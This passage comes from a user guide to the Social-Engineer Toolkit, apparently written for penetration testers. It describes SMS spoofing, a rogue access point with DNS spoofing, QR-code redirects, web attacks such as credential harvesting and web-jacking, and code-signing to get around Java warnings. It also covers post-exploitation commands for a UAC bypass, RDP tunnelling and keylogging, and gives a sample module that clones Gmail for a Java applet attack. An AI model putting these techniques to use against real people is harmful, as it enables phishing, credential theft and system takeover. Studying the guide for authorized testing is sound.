libraries. Once you do that you will have an IDE interface called Arduino. One of the 
MOST important aspects of this is to ensure you set your board to a Teensy USB 
Keyboard/Mouse.  
 
 
 
Once you have this selected, drag your pde file into the Arduino interface. 
Arduino/Teensy supports Linux, OSX, and Windows.  Insert your USB device into the 
computer and upload your code. This will program your device with the SET generated 
code. Below is uploading and the code.

13 SMS Spoofing Attack Vector 
 
Little hint here, this module is only the beginning to a whole new mobile attack platform 
for newer version of SET. The folks at TB-Security.com introduced the SMS spoofing 
module. This module will allow you to spoof your phone number and send an SMS. 
This would be beneficial in social-engineering attacks utilizing the Credential Harvester.

14 Wireless Attack Vector 
 
SET has an attack vector called the wireless attack vector which will spawn an access 
point from a wireless interface card on your machine and leverage DNSSpoof to 
redirect victims browser requests to an attacker vector in SET. You could leverage this 
attack for example by creating the access point and then leveraging the Java Applet 
Attack Vector or the Multi-Attack Vector and when the victim was connected to the 
access point, went to a website, would then be at your attacker machine.

Welcome to the Wireless Attack Vector, this will create an access point 
leveraging 
your wireless card and redirect all DNS queries to you. The concept is fairly 
simple, 
SET will create a wireless access point, dhcp server, and spoof DNS to redirect 
traffic 
to the attacker machine. It will then exit out of that menu with everything running 
as 
a child process. 
 
You can then launch any SET attack vector you want, for example the Java Applet 
attack and 
when a victim joins your access point and tries going to a website, will be 
redirected to 
your attacker machine. 
 
This attack vector uses AirBase-NG, AirMon-NG, DNSSpoof, and dhcpd3 to work 
properly. 
 
What do you want to do: 
 
1. Start the SET Wireless Attack Vector Access Point 
2. Stop the SET Wireless Attack Vector Access Point 
3. Return to the SET main menu.

15 QRCode Attack Vector 
 
The QRCode attack vector utilizes the ability to generate QRCodes natively in Python. 
When scanned, it will redirect to the SET attack vector.  What’s great about this attack 
is the ability to redirect victims to any of the built-in attack vectors SET has available to 
them.

From the example above, we had one shell connect back to us. Say 30 shells 
connected back to us, you would see a listing of the different IP addresses and shells 
available to you. In this scenario we ran into a small problem, we were targeting a 
system that had User Access Control enabled. By initiating the bypassuac flag within 
the SET interactive shell, we were able to spawn a “UAC Safe” shell on the system and 
fully compromise it. Conversely, once we have a UAC-Safe based shell, we can also 
leverage the “grabsystem <ipaddress> <port>” command to spawn a shell that is 
running as SYSTEM on the victim machine. In the next example we’ll port forward the 
victims remote desktop protocol (RDP) port (3389) from the attacker machine over SSH 
    
 
 
 
76 
back to us. 
 
set> ssh_tunnel

[*] Telling the victim machine we are switching to SSH tunnel mode.. 
[*] Acknowledged the server supports SSH tunneling.. 
[*] Tunnel is establishing, check IP Address: 172.16.32.135 on port: 3389 
[*] As an example if tunneling RDP you would rdesktop localhost 3389 
set>   
 
Now all we would need to do in our attack machine is initiate the “rdesktop 
localhost:3389” to connect to the victim machine. Next, we’ll do a simple keystroke 
logging on the victim machine. 
 
set> keystroke_start 
[*] Keystroke logger has been started on the victim machine

These are just some of the commands available, you can also upload and download 
files on the system, add a local admin, add a domain admin, and much more. Simply 
type “help” or “?” in the interactive shell to test the features out. 
 
RATTE tutorial coming soon. 
18 SET Automation 
 
SET has a feature called “set-automate” which will take an answer file (explained in a 
second) and enter the commands in the menu mode for you. For example in prior 
walkthroughs you have to enter each menu each time you prep the attack. So for 
example if I wanted to do the Java Applet I would do this:

 The Web Attack module is  a unique way of utilizing multiple web-based attacks 
 in order to compromise the intended victim. 
 
 The Java Applet Attack method will spoof a Java Certificate and deliver a  
 metasploit based payload. Uses a customized java applet created by Thomas 
 Werth to deliver the payload. 
 
 The Metasploit Browser Exploit method will utilize select Metasploit 
 browser exploits through an iframe and deliver a Metasploit payload. 
 
 The Credential Harvester method will utilize web cloning of a web- 
 site that has a username and password field and harvest all the  
 information posted to the website. 
 
 The TabNabbing method will wait for a user to move to a different 
 tab, then refresh the page to something different. 
 
 The Web-Jacking Attack method was introduced by white_sheep, Emgent  
 and the Back|Track team. This method utilizes iframe replacements to  
 make the highlighted URL link to appear legitimate however when clicked  
 a window pops up then is replaced with the malicious link. You can edit 
 the link replacement settings in the set_config if its too slow/fast. 
 
 The Multi-Attack method will add a combination of attacks through the web 
attack 
 menu. For example you can utilize the Java Applet, Metasploit Browser, 
 Credential Harvester/Tabnabbing, all at once to see which is successful.

The first method will allow SET to import a list of pre-defined 
web applications that it can utilize within the attack. 
 
The second method will completely clone a website of your choosing 
and allow you to utilize the attack vectors within the completely 
same web application you were attempting to clone. 
 
The third method allows you to import your own website, note that you 
should only have an index.html when using the import website 
functionality.

19 Frequently Asked Questions 
 
In an effort to avoid confusion and help understand some of the common questions 
with SET. 
 
Q. I’m using NAT/Port forwarding, how can I configure SET to support this scenario? 
 
A. Edit the config/set_config file and turn AUTO_DETECT=ON to AUTO_DETECT=OFF. 
Once this option is you will be prompted with the following questions: 
 
NAT/Port Forwarding can be used in the cases where your SET machine is 
not externally exposed and may be a different IP address than your reverse listener. 
 
Are you using NAT/Port Forwarding? yes or no: yes 
Enter the IP address to your SET web server (external IP or hostname): 
externalipgoeshere 
 
In some cases you may have your listener on a different IP address, if this is the case 
the next question asks if your IP address is different for the reverse handler/listener. If 
that is the case, specify yes, and enter your separate IP address for the listener. 
 
Is your payload handler (metasploit) on a different IP from your external NAT/Port 
FWD address (yes or no): yes 
Enter the IP address for the reverse handler (reverse payload): 
otherexternalipgoeshere 
 
Q. My Java Applet isn’t working correctly and don’t get prompted for the Applet when 
browsing the site. 
 
A. You either do not have Java installed on the victim machine, or your using a 
NAT/Port forwarding scenario and you need to turn AUTO_DETECT=ON to 
AUTO_DETECT=OFF. If you do a view source on the webpage, the applet should be 
downloaded from your IP address that is accessible from the victim. In some cases 
SET may grab the wrong interface IP as well, in this scenario you again will want to edit 
the set_config and turn AUTO_DETECT to OFF 
 
20 Code Signing Certificates 
 
Most recently, Java released an update that hindered the Java Applet attack slightly. In 
traditional attack forms when using the Java Applet attack, you could create a self-
signed certificate and the publisher could be manipulated to show whatever you 
    
 
 
 
82 
wanted. A few months back they released a new update that showed Publish: 
(UNKNOWN) – PUBLISHERNAME. Although a bit of a hindrance, it wasn’t bad. If a 
prominent name was still used, the success ratio was not hindered and the attack 
vector was still effective. 
 
In the most recent version of Java, it now shows a big “UNKNOWN” under publisher 
and that is it. This isn’t a major showstopper however it does reduce the effectiveness 
slightly on the success ratios on how SET works. In order to compensate for these 
changes, the Java Repeater was introduced. If the victim clicks cancel on the applet, it 
prompts the java applet run again, over and over until they hit run. This is great but it 
wasn’t 100 percent.  
 
Introduced in SET v1.4, you can now purchase your own code-signing certificate 
($200.00ish) and sign your own certificates with whatever you want. This allows you to 
sign the publisher name with whatever you want and get away with the attacks from 
before.  
 
You can create the request and copy and paste the data within the SET menus or you 
can do it on your own and then import it into SET. Simply go into the Web Attack 
vector and select the Create or Import a Code Signing certificate. This will replace the 
Signed_Update.jar.orig which is the template used for all the Java Applet attacks. From 
then on out, you will be able to leverage your code-signing certificate within the SET 
attack vector. 
21 Developing your own SET modules 
 
In version 1.2 introduced the core library modules and the ability to add third party 
modules into SET. Essentially, the folder located in the SET root “modules” can add 
additions or enhancements to SET and add additional contributions to the toolkit. The 
first thing to note is that when you add a new “.py” file to the modules directory, it will 
automatically be imported into SET under “Third Party Modules”. Below is an example 
of a test module: 
 
# 
# These are required fields 
# 
import sys 
# switch over to import core 
sys.path.append("src/core") 
# import the core modules 
try: reload(core) 
except: import core 
 
MAIN="This is a test module" 
AUTHOR="Dave ‘ReL1K’ davek@social-engineer.org" 
    
 
 
 
83 
 
# def main(): header is required 
def main(): 
core.java_applet_attack("https://gmail.com","443","reports/") 
pause=raw_input("This module has finished completing. Press <enter> to continue") 
 
In this example, we create a simple module that will use the java applet attack vector, 
clone a website and launch the attack for us. It handles creating the Metasploit 
payloads and everything for us. Ultimately you can create whatever you want to using 
the function calls built into SET or creating your own. Now if we run SET: 
 
root@bt:/pentest/exploits/set# ./set
